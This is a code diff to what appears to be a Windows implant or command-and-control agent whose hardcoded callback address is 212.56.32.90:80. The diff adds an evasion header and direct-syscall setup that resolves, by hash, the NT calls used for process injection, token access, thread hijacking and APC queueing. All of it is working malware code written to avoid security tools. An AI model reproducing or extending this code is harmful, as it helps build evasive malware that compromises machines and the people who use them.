@@ -1,6 +1,7 @@
 #include <common.h>
 #include <utils.h>
 #include <constexpr.h>
+#include <evasion.h>
 
 #define CONFIG_HOST       L"212.56.32.90"
 #define CONFIG_PORT       80
@@ -183,6 +184,35 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.GetAdaptersInfo = LdrFuncAddr( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );
 
     Instance()->Win32.printf = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
+
+    /*=============================[ init syscall config ]=============================*/
+
+    InitNtdllConf();
+
+    FetchNtSyscall(HASH_STR("NtAllocateVirtualMemory"), &Syscall().SysTable.NtAllocateVirtualMemory);
+    FetchNtSyscall(HASH_STR("NtProtectVirtualMemory"), &Syscall().SysTable.NtProtectVirtualMemory);
+    FetchNtSyscall(HASH_STR("NtWriteVirtualMemory"), &Syscall().SysTable.NtWriteVirtualMemory);
+    FetchNtSyscall(HASH_STR("NtOpenProcess"), &Syscall().SysTable.NtOpenProcess);
+    FetchNtSyscall(HASH_STR("NtOpenThread"), &Syscall().SysTable.NtOpenThread);
+    FetchNtSyscall(HASH_STR("NtOpenThreadToken"), &Syscall().SysTable.NtOpenThreadToken);
+    FetchNtSyscall(HASH_STR("NtOpenProcessToken"), &Syscall().SysTable.NtOpenProcessToken);
+    FetchNtSyscall(HASH_STR("NtClose"), &Syscall().SysTable.NtClose);
+    FetchNtSyscall(HASH_STR("NtQueryVirtualMemory"), &Syscall().SysTable.NtQueryVirtualMemory);
+    FetchNtSyscall(HASH_STR("NtFreeVirtualMemory"), &Syscall().SysTable.NtFreeVirtualMemory);
+    FetchNtSyscall(HASH_STR("NtCreateThreadEx"), &Syscall().SysTable.NtCreateThreadEx);
+    FetchNtSyscall(HASH_STR("NtTerminateThread"), &Syscall().SysTable.NtTerminateThread);
+    FetchNtSyscall(HASH_STR("NtTerminateProcess"), &Syscall().SysTable.NtTerminateProcess);
+    FetchNtSyscall(HASH_STR("NtSuspendThread"), &Syscall().SysTable.NtSuspendThread);
+    FetchNtSyscall(HASH_STR("NtResumeThread"), &Syscall().SysTable.NtResumeThread);
+    FetchNtSyscall(HASH_STR("NtCreateFile"), &Syscall().SysTable.NtCreateFile);
+    FetchNtSyscall(HASH_STR("NtWriteFile"), &Syscall().SysTable.NtWriteFile);
+    FetchNtSyscall(HASH_STR("NtCreateSection"), &Syscall().SysTable.NtCreateSection);
+    FetchNtSyscall(HASH_STR("NtMapViewOfSection"), &Syscall().SysTable.NtMapViewOfSection);
+    FetchNtSyscall(HASH_STR("NtUnmapViewOfSection"), &Syscall().SysTable.NtUnmapViewOfSection);
+    FetchNtSyscall(HASH_STR("NtGetContextThread"), &Syscall().SysTable.NtGetContextThread);
+    FetchNtSyscall(HASH_STR("NtSetContextThread"), &Syscall().SysTable.NtSetContextThread);
+    FetchNtSyscall(HASH_STR("NtWaitForSingleObject"), &Syscall().SysTable.NtWaitForSingleObject);
+    FetchNtSyscall(HASH_STR("NtQueueApcThread"), &Syscall().SysTable.NtQueueApcThread);
 
     /*============================[ Agent config initialization ]============================*/
 
